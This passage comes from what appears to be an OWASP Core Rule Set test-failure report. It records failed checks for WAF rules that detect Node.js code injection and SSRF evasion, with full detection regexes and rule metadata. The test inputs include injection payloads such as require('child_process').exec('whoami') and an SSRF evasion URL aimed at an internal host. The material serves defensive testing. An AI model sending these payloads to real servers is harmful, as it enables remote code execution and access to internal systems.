          "text" : " Last two are used by nodejsshell.py,"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " As base64 is sometimes (but not always) used to encode serialized values,"
        }, {
          "type" : "Comment",
          "text" : " use multiMatch and t:base64decode."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934100.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934100"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Stricter sibling: 934101"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "_(?:\\$\\$ND_FUNC\\$\\$_|_js_function)|(?:\\beval|new[\\s\\x0b]+Function[\\s\\x0b]*)\\(|(?:String\\.fromCharCod|Module:prototyp)e|function\\(\\)\\{|this\\.constructor|module\\.exports=|\\([\\s\\x0b]*[^0-9A-Z_a-z]child_process[^0-9A-Z_a-z][\\s\\x0b]*\\)|cons(?:tructor:constructor|ole(?:\\.(?:(?:debu|lo)g|error|info|trace|warn)(?:\\.call)?\\(|\\[[\\\"'`](?:(?:debu|lo)g|error|info|trace|warn)[\\\"'`]\\]))|process(?:\\.(?:(?:a(?:ccess|ppendfile|rgv|vailability)|c(?:aveats|h(?:mod|own)|(?:los|opyfil)e|p|reate(?:read|write)stream)|ex(?:ec(?:file)?|ists)|f(?:ch(?:mod|own)|data(?:sync)?|s(?:tat|ync)|utimes)|inodes|l(?:chmod|ink|stat|utimes)|mkd(?:ir|temp)|open(?:dir)?|r(?:e(?:ad(?:dir|file|link|v)?|name)|m)|s(?:pawn(?:file)?|tat|ymlink)|truncate|u(?:n(?:link|watchfile)|times)|w(?:atchfile|rite(?:file|v)?))(?:sync)?(?:\\.call)?\\(|binding|constructor|env|global|main(?:Module)?|process|require)|\\[[\\\"'`](?:(?:a(?:ccess|ppendfile|rgv|vailability)|c(?:aveats|h(?:mod|own)|(?:los|opyfil)e|p|reate(?:read|write)stream)|ex(?:ec(?:file)?|ists)|f(?:ch(?:mod|own)|data(?:sync)?|s(?:tat|ync)|utimes)|inodes|l(?:chmod|ink|stat|utimes)|mkd(?:ir|temp)|open(?:dir)?|r(?:e(?:ad(?:dir|file|link|v)?|name)|m)|s(?:pawn(?:file)?|tat|ymlink)|truncate|u(?:n(?:link|watchfile)|times)|w(?:atchfile|rite(?:file|v)?))(?:sync)?|binding|constructor|env|global|main(?:Module)?|process|require)[\\\"'`]\\])|(?:binding|constructor|env|global|main(?:Module)?|process|require)\\[|require(?:\\.(?:resolve(?:\\.call)?\\(|main|extensions|cache)|\\[[\\\"'`](?:(?:resolv|cach)e|main|extensions)[\\\"'`]\\])"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "base64Decode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node.js Injection Attack 1/2"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934100",
    "test_id" : 14,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934100.yaml",
    "description" : "console.info test (square bracket property access)",
    "cause" : "failed expect_id check: 934100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 14,
      "desc" : "console.info test (square bracket property access)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=console[\"info\"](1)",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ NodeJS Insecure unserialization / generic RCE signatures ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Libraries performing insecure unserialization:"
        }, {
          "type" : "Comment",
          "text" : " - node-serialize: _$$ND_FUNC$$_ (CVE-2017-5941)"
        }, {
          "type" : "Comment",
          "text" : " - funcster: __js_function"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See:"
        }, {
          "type" : "Comment",
          "text" : " https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/"
        }, {
          "type" : "Comment",
          "text" : " https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Some generic snippets used:"
        }, {
          "type" : "Comment",
          "text" : " - function() {"
        }, {
          "type" : "Comment",
          "text" : " - new Function("
        }, {
          "type" : "Comment",
          "text" : " - eval("
        }, {
          "type" : "Comment",
          "text" : " - String.fromCharCode("
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Last two are used by nodejsshell.py,"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " As base64 is sometimes (but not always) used to encode serialized values,"
        }, {
          "type" : "Comment",
          "text" : " use multiMatch and t:base64decode."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934100.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934100"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Stricter sibling: 934101"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "_(?:\\$\\$ND_FUNC\\$\\$_|_js_function)|(?:\\beval|new[\\s\\x0b]+Function[\\s\\x0b]*)\\(|(?:String\\.fromCharCod|Module:prototyp)e|function\\(\\)\\{|this\\.constructor|module\\.exports=|\\([\\s\\x0b]*[^0-9A-Z_a-z]child_process[^0-9A-Z_a-z][\\s\\x0b]*\\)|cons(?:tructor:constructor|ole(?:\\.(?:(?:debu|lo)g|error|info|trace|warn)(?:\\.call)?\\(|\\[[\\\"'`](?:(?:debu|lo)g|error|info|trace|warn)[\\\"'`]\\]))|process(?:\\.(?:(?:a(?:ccess|ppendfile|rgv|vailability)|c(?:aveats|h(?:mod|own)|(?:los|opyfil)e|p|reate(?:read|write)stream)|ex(?:ec(?:file)?|ists)|f(?:ch(?:mod|own)|data(?:sync)?|s(?:tat|ync)|utimes)|inodes|l(?:chmod|ink|stat|utimes)|mkd(?:ir|temp)|open(?:dir)?|r(?:e(?:ad(?:dir|file|link|v)?|name)|m)|s(?:pawn(?:file)?|tat|ymlink)|truncate|u(?:n(?:link|watchfile)|times)|w(?:atchfile|rite(?:file|v)?))(?:sync)?(?:\\.call)?\\(|binding|constructor|env|global|main(?:Module)?|process|require)|\\[[\\\"'`](?:(?:a(?:ccess|ppendfile|rgv|vailability)|c(?:aveats|h(?:mod|own)|(?:los|opyfil)e|p|reate(?:read|write)stream)|ex(?:ec(?:file)?|ists)|f(?:ch(?:mod|own)|data(?:sync)?|s(?:tat|ync)|utimes)|inodes|l(?:chmod|ink|stat|utimes)|mkd(?:ir|temp)|open(?:dir)?|r(?:e(?:ad(?:dir|file|link|v)?|name)|m)|s(?:pawn(?:file)?|tat|ymlink)|truncate|u(?:n(?:link|watchfile)|times)|w(?:atchfile|rite(?:file|v)?))(?:sync)?|binding|constructor|env|global|main(?:Module)?|process|require)[\\\"'`]\\])|(?:binding|constructor|env|global|main(?:Module)?|process|require)\\[|require(?:\\.(?:resolve(?:\\.call)?\\(|main|extensions|cache)|\\[[\\\"'`](?:(?:resolv|cach)e|main|extensions)[\\\"'`]\\])"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "base64Decode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node.js Injection Attack 1/2"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934100",
    "test_id" : 23,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934100.yaml",
    "description" : "require child_process",
    "cause" : "failed expect_id check: 934100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 23,
      "desc" : "require child_process",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=require(\"child_process\").exec('whoami')",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ NodeJS Insecure unserialization / generic RCE signatures ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Libraries performing insecure unserialization:"
        }, {
          "type" : "Comment",
          "text" : " - node-serialize: _$$ND_FUNC$$_ (CVE-2017-5941)"
        }, {
          "type" : "Comment",
          "text" : " - funcster: __js_function"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See:"
        }, {
          "type" : "Comment",
          "text" : " https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/"
        }, {
          "type" : "Comment",
          "text" : " https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Some generic snippets used:"
        }, {
          "type" : "Comment",
          "text" : " - function() {"
        }, {
          "type" : "Comment",
          "text" : " - new Function("
        }, {
          "type" : "Comment",
          "text" : " - eval("
        }, {
          "type" : "Comment",
          "text" : " - String.fromCharCode("
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Last two are used by nodejsshell.py,"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " As base64 is sometimes (but not always) used to encode serialized values,"
        }, {
          "type" : "Comment",
          "text" : " use multiMatch and t:base64decode."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934100.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934100"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Stricter sibling: 934101"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "_(?:\\$\\$ND_FUNC\\$\\$_|_js_function)|(?:\\beval|new[\\s\\x0b]+Function[\\s\\x0b]*)\\(|(?:String\\.fromCharCod|Module:prototyp)e|function\\(\\)\\{|this\\.constructor|module\\.exports=|\\([\\s\\x0b]*[^0-9A-Z_a-z]child_process[^0-9A-Z_a-z][\\s\\x0b]*\\)|cons(?:tructor:constructor|ole(?:\\.(?:(?:debu|lo)g|error|info|trace|warn)(?:\\.call)?\\(|\\[[\\\"'`](?:(?:debu|lo)g|error|info|trace|warn)[\\\"'`]\\]))|process(?:\\.(?:(?:a(?:ccess|ppendfile|rgv|vailability)|c(?:aveats|h(?:mod|own)|(?:los|opyfil)e|p|reate(?:read|write)stream)|ex(?:ec(?:file)?|ists)|f(?:ch(?:mod|own)|data(?:sync)?|s(?:tat|ync)|utimes)|inodes|l(?:chmod|ink|stat|utimes)|mkd(?:ir|temp)|open(?:dir)?|r(?:e(?:ad(?:dir|file|link|v)?|name)|m)|s(?:pawn(?:file)?|tat|ymlink)|truncate|u(?:n(?:link|watchfile)|times)|w(?:atchfile|rite(?:file|v)?))(?:sync)?(?:\\.call)?\\(|binding|constructor|env|global|main(?:Module)?|process|require)|\\[[\\\"'`](?:(?:a(?:ccess|ppendfile|rgv|vailability)|c(?:aveats|h(?:mod|own)|(?:los|opyfil)e|p|reate(?:read|write)stream)|ex(?:ec(?:file)?|ists)|f(?:ch(?:mod|own)|data(?:sync)?|s(?:tat|ync)|utimes)|inodes|l(?:chmod|ink|stat|utimes)|mkd(?:ir|temp)|open(?:dir)?|r(?:e(?:ad(?:dir|file|link|v)?|name)|m)|s(?:pawn(?:file)?|tat|ymlink)|truncate|u(?:n(?:link|watchfile)|times)|w(?:atchfile|rite(?:file|v)?))(?:sync)?|binding|constructor|env|global|main(?:Module)?|process|require)[\\\"'`]\\])|(?:binding|constructor|env|global|main(?:Module)?|process|require)\\[|require(?:\\.(?:resolve(?:\\.call)?\\(|main|extensions|cache)|\\[[\\\"'`](?:(?:resolv|cach)e|main|extensions)[\\\"'`]\\])"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "base64Decode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeWhitespace"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node.js Injection Attack 1/2"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934101",
    "test_id" : 4,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934101.yaml",
    "description" : "require child_process",
    "cause" : "failed expect_id check: 934101 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "require child_process",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=require(\"child_process\").exec('whoami')",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934101 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934101,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This rule is a stricter sibling of 934100."
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:close|exists|fork|(?:ope|spaw)n|re(?:ad|quire)|w(?:atch|rite))[\\s\\x0b]*\\("
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934101
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "base64Decode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Node.js Injection Attack 2/2"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-javascript"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-nodejs"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-injection-generic"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/242"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "multi_match"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 20,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Evasion technique 1",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 20,
      "desc" : "SSRF - Evasion technique 1",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=http%3A%2F%2Fgoogle.com%3A80%20%26%40google.com%3A80%23%20%40127.88.23.245%3A22%2F",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
